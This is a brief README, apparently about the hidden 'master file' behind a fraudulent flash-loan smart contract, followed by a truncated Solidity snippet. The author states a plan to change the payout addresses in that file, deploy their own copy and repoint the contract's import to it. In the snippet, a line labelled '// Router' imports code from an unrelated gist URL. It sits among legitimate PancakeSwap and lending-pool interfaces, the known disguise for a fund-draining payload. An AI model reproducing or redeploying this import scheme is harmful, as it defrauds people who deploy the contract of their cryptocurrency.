# Import-Master-File
I think I found where the master file for that bogus import on the orignal flash loan 
It lies in line 14 those two addresses , the script is in the link Im going to change the addresses in the master file and deploy my own , and make the import point to it , 
pragma solidity ^0.5.0;

// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";

//BakerySwp Smart contracts
import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";

// Router
import "https://gist.githubusercontent.com/ealex2020/7d467106ca944b2ef2b9daf7ee968595/raw/57dba0552858ebdf1bc40c42aaaf5884fbf9c1a3/.sol";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

contract InitiateFlashLoan {
